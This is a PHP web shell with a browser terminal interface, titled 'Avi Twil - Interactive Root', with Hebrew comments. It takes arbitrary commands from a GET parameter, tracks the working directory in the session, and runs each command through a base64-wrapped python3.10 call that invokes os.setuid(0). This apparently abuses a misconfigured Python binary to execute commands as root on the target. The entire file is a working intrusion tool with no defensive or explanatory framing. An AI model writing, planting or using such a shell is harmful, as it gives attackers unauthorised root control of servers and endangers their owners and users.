<?php
session_start();
if (!isset($_SESSION['pwd'])) $_SESSION['pwd'] = trim(shell_exec('pwd'));

// טיפול בבקשה (שינינו ל-GET כדי להתאים בדיוק למודל שעובד לך)
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $pwd = $_SESSION['pwd'];

    // ניהול CD ברמת הסשן
    if (preg_match('/^cd\s+(.+)/', $cmd, $matches)) {
        $target = $matches[1];
        $new_dir = shell_exec("cd $pwd && cd $target && pwd 2>&1");
        if ($new_dir) {
            $_SESSION['pwd'] = trim($new_dir);
            echo "[DIR_CHANGED]" . $_SESSION['pwd'];
        }
        exit;
    }

    // הפקודה המלאה כולל ה-CD
    $full_cmd = "cd $pwd && $cmd";
    $c = base64_encode($full_cmd);

    // שימוש בפורמט המדויק שעובד לך, עם התאמה קלה להחזרת פלט
    system("/usr/bin/python3.10 -c 'import os,base64; os.setuid(0); os.system(base64.b64decode(\"$c\").decode() + \" 2>&1\")'");
    exit;
}
?>
<html>
<head>
    <title>Avi Twil - Interactive Root</title>
    <style>
        body { background: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
        #term { background: #000; border: 1px solid #444; height: 80vh; overflow-y: auto; padding: 15px; }
        .prompt { color: #ff5555; }
        input { background: transparent; border: none; color: #00ff00; font-family: inherit; font-size: 16px; width: 70%; outline: none; }
        .out { margin-bottom: 10px; white-space: pre-wrap; color: #ccc; }
    </style>
</head>
<body>
    <h1>Interactive Shell - Based on Avi Twil's Logic</h1>
    <div id="term">
        <div id="log"></div>
        <div id="input-line">
            <span class="prompt" id="p_label">root@target:<?php echo $_SESSION['pwd']; ?># </span>
            <input type="text" id="shell_input" autofocus autocomplete="off">
        </div>
    </div>

    <script>
        const input = document.getElementById('shell_input');
        const log = document.getElementById('log');
        const p_label = document.getElementById('p_label');
        let history = [];
        let hIdx = -1;

        input.addEventListener('keydown', async (e) => {
            if (e.key === 'ArrowUp') {
                if (hIdx < history.length - 1) { hIdx++; input.value = history[history.length - 1 - hIdx]; }
                e.preventDefault();
            } 
            else if (e.key === 'ArrowDown') {
                if (hIdx > 0) { hIdx--; input.value = history[history.length - 1 - hIdx]; } 
                else { hIdx = -1; input.value = ''; }
                e.preventDefault();
            }
            else if (e.key === 'Enter') {
                const cmd = input.value;
                if (!cmd) return;
                if (cmd === 'clear') { log.innerHTML = ''; input.value = ''; return; }

                log.innerHTML += `<div><span class="prompt">${p_label.innerText}</span> ${cmd}</div>`;
                history.push(cmd);
                hIdx = -1;
                input.value = '';

                // שליחה ב-GET כפי שהסקריפט המקורי שלך עושה
                const res = await fetch(`?cmd=${encodeURIComponent(cmd)}`);
                const out = await res.text();

                if (out.startsWith("[DIR_CHANGED]")) {
                    const newPath = out.replace("[DIR_CHANGED]", "");
                    p_label.innerText = `root@target:${newPath}# `;
                } else {
                    log.innerHTML += `<div class="out">${out}</div>`;
                }
                document.getElementById('term').scrollTop = document.getElementById('term').scrollHeight;
            }
        });
    </script>
</body>
</html>
